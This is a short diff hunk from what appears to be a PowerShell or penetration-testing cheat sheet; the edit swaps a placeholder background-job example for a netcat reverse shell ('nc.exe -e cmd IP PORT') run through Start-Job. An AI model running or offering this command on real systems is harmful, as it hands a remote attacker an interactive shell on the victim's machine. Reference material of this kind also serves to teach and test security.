@@ -9459,7 +9459,7 @@ powershell.exe -noprofile -executionpolicy bypass -file .\<FILE>.ps1
 ###### Powershell background process
 
 ```c
-Start-Job { C:\absolute\path\to\command.exe --afileparameter C:\absolute\path\to\file.txt }
+Start-Job { C:\windows\temp\nc.exe -e cmd IP PORT }
 ```
 
 ##### Import Module to PowerShell cmdlet
